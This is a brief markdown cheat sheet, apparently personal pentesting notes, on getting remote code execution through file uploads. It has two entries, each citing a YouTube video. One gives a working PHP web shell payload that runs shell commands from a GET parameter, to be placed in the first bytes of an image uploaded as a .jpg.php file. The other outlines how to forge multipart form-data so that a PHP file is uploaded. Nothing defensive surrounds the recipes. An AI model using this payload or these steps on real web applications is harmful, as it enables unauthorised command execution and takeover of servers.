
# RCE using image bytes with php code
```python
- upload image.jpg.php
- on the first line of bytes of the image, add the php code <?=`$_GET['cmd']`?>

source: https://www.youtube.com/watch?v=4eGByP9mIH0
```


# RCE via custom multiple form-data
```python
- copy the number of each form-data
- upload a content-disposition and content-type with phph file code as content

source: https://www.youtube.com/watch?v=XyE6yTDFQ68
```














